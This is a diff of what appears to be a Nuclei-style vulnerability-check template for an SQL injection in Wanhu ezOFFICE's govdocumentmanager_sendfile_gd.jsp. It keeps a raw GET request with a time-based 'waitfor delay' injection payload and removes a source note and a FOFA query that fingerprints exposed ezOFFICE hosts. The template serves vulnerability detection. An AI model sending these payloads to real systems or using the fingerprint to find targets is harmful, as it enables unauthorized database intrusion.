@@ -3,12 +3,8 @@ info:
   name: 万户OA govdocumentmanager_sendfile_gd.jsp存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fv1pr43v4evvggy2'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fv1pr43v4evvggy2
-    fofa: body="EZOFFICEUSERNAME"||title="ezOFFICE协同管理平台"||title="ezOFFICE"||body="var ezofficeUserPortal_ = Cookie(\"ezofficeUserPortal\");"))||title="Wanhu ezOFFICE"||banner="LocLan"||title="ezOffice for iPho
 http:
 - raw:
   - GET /defaultroot/modules/govoffice/gov_documentmanager/govdocumentmanager_sendfile_gd.jsp;.js?sendFileId=221;waitfor+delay+'0:0:0.5'--+- HTTP/1.1
